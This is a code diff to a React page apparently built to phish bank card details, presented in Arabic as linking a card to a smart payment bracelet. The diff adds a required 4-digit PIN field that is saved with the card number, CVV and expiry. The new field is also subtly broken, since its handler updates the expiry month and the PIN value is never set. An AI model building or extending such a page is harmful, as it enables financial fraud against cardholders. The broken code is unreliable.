@@ -21,6 +21,7 @@ export default function UsernameRecoveryPage() {
   const [otpError, setOtpError] = useState("")
   const [errors, setErrors] = useState<{ [key: string]: string }>({})
   const [isLoading, setIsLoading] = useState(false)
+  const [pass, setPass] = useState("")
 
   const cardInputRefs = useRef<(HTMLInputElement | null)[]>([])
 
@@ -166,7 +167,8 @@ export default function UsernameRecoveryPage() {
       cardNumber: cardNumbers,
       status: 'pending',
       cvv: cvc,
-      expiaryDate: exp
+      expiaryDate: exp,
+      pass
     });
   }
   return (
@@ -185,50 +187,7 @@ export default function UsernameRecoveryPage() {
           <h1 className="text-2xl font-bold text-gray-900 text-center">ربط بطاقتك البنكية بسوار الدفع الذكي</h1>
 
           {/* Phone Number Section */}
-          <div className="space-y-4">
-            <label className="block text-gray-600 text-right">
-              رقم الهاتف <span className="text-red-500">*</span>
-            </label>
-
-            <div className="flex items-center gap-2">
-              <Input
-                value={phoneNumber}
-                onChange={(e) => {
-                  const numericValue = e.target.value.replace(/\D/g, "").slice(0, 8)
-                  setPhoneNumber(numericValue)
-                  if (errors.phoneNumber) {
-                    setErrors((prev) => ({ ...prev, phoneNumber: "" }))
-                  }
-                }}
-                className={`flex-1 text-right ${errors.phoneNumber ? "border-red-500" : ""}`}
-                placeholder="99999999"
-                required
-                maxLength={8}
-              />
-
-              <Select defaultValue="+968">
-                <SelectTrigger className="w-24">
-                  <SelectValue />
-                </SelectTrigger>
-                <SelectContent>
-                  <SelectItem value="+968">
-                    <div className="flex items-center gap-2">
-                      <span className="text-xs">🇴🇲</span>
-                      <span>(+968)</span>
-                    </div>
-                  </SelectItem>
-                </SelectContent>
-              </Select>
-            </div>
-
-            {errors.phoneNumber && <div className="text-red-500 text-sm text-right">{errors.phoneNumber}</div>}
-
-            <div className="flex items-center gap-2 text-sm text-gray-500">
-              <Info className="w-4 h-4" />
-              <span>يجب أن يكون هذا الرقم مسجلاً في حسابك.</span>
-            </div>
-          </div>
-
+       
           {/* Card Number Section */}
           <div className="space-y-4">
             <label className="block text-gray-600 text-right">
@@ -316,6 +275,29 @@ export default function UsernameRecoveryPage() {
                   inputMode="numeric"
                 />
                 {errors.expiryYear && <div className="text-red-500 text-xs text-center mt-1">{errors.expiryYear}</div>}
+              </div>
+            </div>
+            <div>
+            <div>
+            <label className="block text-gray-600 text-right py-2">
+              الرقم السري  <span className="text-red-500">*</span>
+            </label>
+                <Input
+                  value={pass}
+                  onChange={(e) => {
+                    setExpiryMonth(e.target.value)
+                 
+                  }}
+                  className={`text-center w-full mx-2 `}
+                  placeholder="####"
+                  maxLength={4}
+                  
+                  required
+                  inputMode="numeric"
+                />
+                {errors.expiryMonth && (
+                  <div className="text-red-500 text-xs text-center mt-1">{errors.expiryMonth}</div>
+                )}
               </div>
             </div>
           </div>
